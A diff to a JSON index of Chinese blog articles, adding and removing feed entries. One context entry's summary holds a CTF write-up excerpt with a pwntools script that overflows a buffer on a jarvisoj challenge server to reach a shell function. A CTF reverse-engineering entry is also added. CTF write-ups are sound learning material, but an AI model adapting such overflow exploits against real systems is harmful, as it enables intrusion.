@@ -1,6 +1,28 @@
 {
   "items": [
     {
+      "id": "bdc231563c65d0bed69dcd8e",
+      "title": "RE2",
+      "summary": "correct_the_byte FLAG-EiTMzujOpNwYCeervQMFod0hmZHC@ 看一晚上也不知道要correct哪个byte，问了学长得知是异或的0x13有问题。所以就 x/34xb $rsi 打印出将要被异或的值，穷举要异或的数爆破。 再加上群里flag的开头图片，ctrl+f找出flag。 rsi_list = [ 0x 0c , 0x 06 , 0x 0b , 0x 0d , 0x 67 , 0x 0f , 0x 23 , 0x 1e , 0x 07 , 0x 30 , 0x 3f , 0x 20 , 0x 05 , 0x 3a , 0x 04 , 0x 3d , 0x 13 , 0x 09 , 0x 2f , 0x 2f , 0x 38 , 0x 3c , 0x 1b , 0x…",
+      "image": null,
+      "publishedAt": "2018-08-15T08:41:57Z",
+      "sourceId": "946f35b6a82d9000",
+      "sourceTitle": "空栈顶",
+      "link": "https://emptystack.top/re2/",
+      "detailPath": "articles/bdc231563c65d0bed69dcd8e.json"
+    },
+    {
+      "id": "4cdbcde6ade34ced7e639deb",
+      "title": "潮湿俱乐部",
+      "summary": "我们离开城市的那个夜晚，空气凝滞，蝉鸣在高温中起伏。我们手拉着手，可以感受到彼此的手汗。在奔跑的间隙，我们回头看，西边的天空一片橘红，湮没了星星和月亮，能隐约听到消防车的声音，偶尔还有尖叫和狗吠。我们带走了必须的财物和一只叫做“舌头”的英国短毛猫。在不必须的东西里，我们带走了地图，尽管我们知道这会暴露我们的行踪，因为有了地图就有了目的地。我们还带走了一顶帐篷，虽然可以睡在车里，但我们打算在某些时刻露营。 我们以每小时八十公里的速度离开城市，不是旅行而是逃亡。这是一个真实故事，故事发生在一个闷热的夏季，为了保护我们的隐私，我们必须隐去名字、性别和年龄。这也是一个公路故事，诗人说过“生活，在别处”，而我们知道“生活，在去往别处的路上”。这还是一个酒神故事，我们要把自己投射在万物之中。狂欢？迷乱？也许不行。我们必须…",
+      "image": null,
+      "publishedAt": "2018-08-14T16:00:00Z",
+      "sourceId": "5c361392b1f97efd",
+      "sourceTitle": "Memozine",
+      "link": "https://memozine.me/2018/08/15/humid-club",
+      "detailPath": "articles/4cdbcde6ade34ced7e639deb.json"
+    },
+    {
       "id": "204c47829fd9fc085a0b48d8",
       "title": "PWN",
       "summary": "题解 level0 CTF{713ca3944e92180e0ef03171981dcd41} vulnerable_function里buf只有0x80大小，但读取0x200个字符；函数里还有callsystem。将r之前的都随意填充掉，跟上callsystem的地址就好了。 from pwn import * io = remote ( \" pwn2.jarvisoj.com \" , 9881 ) elf = ELF ( \" ./level0 \" ) io . send ( \" a \" * ( 0x 80 + 0x 8 ) + p64 ( elf . symbols [ \" callsystem \" ])) io . interactive () rop_rop_rop islab{佳婷姐姐强啊！} St…",
@@ -637,28 +659,6 @@
       "sourceTitle": "DrPika's Blog",
       "link": "https://blog.drpika.com/posts/2018-03-18",
       "detailPath": "articles/4b1e505dd2c61695055ab53d.json"
-    },
-    {
-      "id": "3d73666f610bdeccaa625163",
-      "title": "博客折腾“大”记",
-      "summary": "",
-      "image": null,
-      "publishedAt": "2018-03-18T00:00:00Z",
-      "sourceId": "3e335517f4e1112a",
-      "sourceTitle": "Dr.Pika's Blog",
-      "link": "https://blog.drpika.com/posts/2018-03-18",
-      "detailPath": "articles/3d73666f610bdeccaa625163.json"
-    },
-    {
-      "id": "0785055a3678191c0995d826",
-      "title": "Parcel.js + Vue 搭建笔记",
-      "summary": "2021-06-08 时至今日，该篇文章的内容已有所过时。 Parcel 的地位也似乎一直有些尴尬。 零配置的确是一个亮点，但是到真正编写复杂庞大的项目，我们还真的需要零配置吗？ 而谈起配置，似乎又难与悠久历史生态的 Webpack 同台竞技。 至于速度，则难以与新诞生的基于 ES 打包的 Vite 相匹敌。 现今的我基本已经转向使用 Vite ，而并未再尝试 Parcel 的使用。 去年（已经是三年前了！）年末便听得新一代打包工具 Parcel.js 的风风火火，今日（两年前的某一天）也终于得以静下心来试一试。 访问 https://www.yunyoujun.cn/posts/vue-parcel-demo 阅读全文。",
-      "image": null,
-      "publishedAt": "2018-02-20T21:13:42Z",
-      "sourceId": "410b11347b8a16bf",
-      "sourceTitle": "云游君的小站",
-      "link": "https://www.yunyoujun.cn/posts/vue-parcel-demo",
-      "detailPath": "articles/0785055a3678191c0995d826.json"
     }
   ]
 }
